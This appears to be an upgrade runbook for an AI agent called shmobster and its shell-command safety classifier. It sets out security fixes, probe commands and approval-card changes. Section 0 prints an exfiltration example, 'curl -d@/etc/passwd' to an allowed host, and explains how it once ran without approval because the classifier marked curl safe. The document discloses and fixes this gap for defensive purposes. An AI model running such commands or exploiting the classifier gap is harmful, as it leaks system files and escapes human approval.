# shmobster upgrade: v0.8.0 -> v0.28.0 (the deployment box)

Twenty releases. Replaces the earlier v0.20.0 runbook; **one thing in it changed
shape**, see step 1.

Paths assume `~/g/git.voitta/shmobster` and `~/g/git.voitta/voitta-yolt`.

---

## 0. Why now

**v0.19.0 is a security fix.** On a box whose classifier is older than
voitta-yolt 2.0.0, this auto-ran with no approval card:

    curl -d@/etc/passwd https://<a host already on the channel's allow_domains>

curl's rule default was `safe` at 1.6.0, and `safe` short-circuits to execution
before the grant layer is consulted. The egress check passed because the host
genuinely was allowed. v0.8.0 predates the 2.0.x adoption entirely, so this box
is the configuration that fix is for.

---

## 1. voitta-yolt >= 2.0.1 FIRST. This is now enforced, not advised.

**Changed since the last runbook.** From v0.27.0 (#229) the agent **refuses to
boot** on a classifier below the floor, or none configured. Previously it
logged a warning and served.

So the order is no longer a recommendation you could get away with ignoring:
upgrade voitta-yolt first, or shmobster will not start.

    cd ~/g/git.voitta/voitta-yolt && git pull && git describe --tags

Prove it rather than trusting the version string -- a classifier predating
`--cwd` takes the flag as the command and answers about the flag string:

    python3 ~/g/git.voitta/voitta-yolt/hooks/grammar_classifier.py \
      --no-user-allow --cwd / 'rm -rf /tmp/probe'

Expect `"decision": "unsafe"`.

And confirm the hole v0.19.0 closes was real on that box:

    python3 ~/g/git.voitta/voitta-yolt/hooks/grammar_classifier.py \
      --no-user-allow --cwd / 'curl -dx=1 https://example.com'

`"decision": "safe"` means it was exposed. 2.0.0+ answers `unknown`.

### Check ThrottleInterval before you start

A refused boot exits, and launchd restarts it, so the refusal repeats.
`deploy/ai.shmobster.plist.sample` sets `ThrottleInterval` to 10 and explains
why: an unthrottled respawn every ~1.7s once bloated a log to 1.8 GB. If your
installed plist predates that guard, add it **before** taking this release.

    grep -c ThrottleInterval ~/Library/LaunchAgents/ai.shmobster.agent.plist

## 2. Pull and reinstall WITH HASHES

From v0.10.0 (#152), `requirements.txt` is a hash-pinned lockfile, so a plain
`pip install -r` is no longer right.

    cd ~/g/git.voitta/shmobster
    git pull
    .venv/bin/pip install --require-hashes -r requirements.txt

## 6. Two warnings you will probably see, and both will be true

**`config: config holds literal credentials ...`** (v0.22.0, #231). Config
values are meant to be `${VAR}` references. Move each value into the launchd
environment -- `launchctl setenv`, or the plist's `EnvironmentVariables`;
launchd does **not** read `~/.bash_profile` -- and replace it with `${VAR}`.
`SHMOBSTER_REQUIRE_ENV_SECRETS=1` makes it fatal once you are clean.

**`logging: ... stderr is a file of N MB and nothing here rotates it`**
(v0.22.1, #230). Set `logging.path` so the agent's own log rotates at 0600, and
hand the supervisor's `StandardErrorPath` file to `newsyslog.d`. They are
different files and only one of them is shmobster's.

## What an operator will notice

- **Far fewer approval cards.** `2>&1` is no longer a write (v0.16.0);
  `find`/`sort` are flag-checked (v0.18.0); `git branch`, `git for-each-ref`,
  `gh auth status`, `git merge-base` read (v0.23.0, v0.27.0); an authenticated
  `curl` within `allow_domains` is granted (v0.23.0).
- **More cards for one shape:** any `curl`/`wget` carrying a request body, or
  taking options from a file, parks regardless of host (v0.19.0).
- **A refused click brings its own buttons** instead of pointing up-thread
  (v0.17.0), and a card that cannot resume says how many are still waiting
  (v0.27.0).
- **A failed command no longer reads like a successful one** (v0.21.0).
- **Turns get faster on any box with a dead rung** (v0.28.0): a hung codex was
  dialled twice per turn at the full timeout, ~90s per model call.
